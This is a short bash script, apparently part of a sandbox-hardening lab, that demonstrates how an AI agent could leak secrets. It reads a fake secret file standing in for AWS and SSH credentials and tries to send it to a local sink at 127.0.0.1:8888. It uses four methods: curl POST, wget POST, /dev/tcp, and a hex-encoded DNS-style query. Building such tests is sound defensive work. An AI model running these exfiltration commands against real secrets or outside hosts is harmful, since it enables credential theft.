# LAB ARTIFACT — fake attack for hardening demonstration only
# Attack 05: Exfiltration — Secret Read + Egress
#
# Goal: Read the fake secret and POST it to a local sink (127.0.0.1:8888).
#        This demonstrates the exfiltration attack class: an agent that can
#        read a secret and reach a network endpoint can exfiltrate the secret.
#
# NOTE: Uses ONLY the local exfil endpoint (127.0.0.1:8888). Never touches
#       any real/third-party system. The secret is fake.
#
# Targets:
#   - Read: fake-secret.txt (stands in for credentials/, ~/.aws/, ~/.ssh/)
#   - Egress: POST to 127.0.0.1:8888

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SECRET_FILE="$SCRIPT_DIR/fake-secret.txt"
EXFIL_URL="http://127.0.0.1:8888/exfil"

echo "[attack-05] Attempting to read secret and exfiltrate..."

# Step 1: Read the fake secret
if [ -f "$SECRET_FILE" ]; then
    SECRET=$(cat "$SECRET_FILE")
    echo "[attack-05] Secret read: $SECRET"
else
    echo "[attack-05] Secret file not found at $SECRET_FILE"
    SECRET="FALLBACK-no-secret-found"
fi

# Step 2: Attempt exfiltration via various methods

# Method 1: curl POST
echo "[attack-05] Method 1: curl POST"
curl -s -X POST \
  -H "Content-Type: text/plain" \
  -d "$SECRET" \
  "$EXFIL_URL" 2>&1 || echo "[attack-05] curl failed (network blocked?)"

# Method 2: wget POST
echo "[attack-05] Method 2: wget POST"
wget -q -O- --post-data="$SECRET" "$EXFIL_URL" 2>&1 || echo "[attack-05] wget failed (network blocked?)"

# Method 3: /dev/tcp (bash built-in, no external tools needed)
echo "[attack-05] Method 3: /dev/tcp"
(echo -e "POST /exfil HTTP/1.0\r\nHost: 127.0.0.1\r\nContent-Length: ${#SECRET}\r\n\r\n$SECRET" > /dev/tcp/127.0.0.1/8888) 2>&1 || echo "[attack-05] /dev/tcp failed (network blocked?)"

# Method 4: Encode in DNS-style query (demonstration only)
echo "[attack-05] Method 4: DNS-encoded exfil attempt"
ENCODED=$(echo "$SECRET" | od -A n -t x1 | tr -d ' \n')
curl -s "http://127.0.0.1:8888/dns?q=${ENCODED}" 2>&1 || echo "[attack-05] DNS-style exfil failed"

echo "[attack-05] Attack attempts complete."
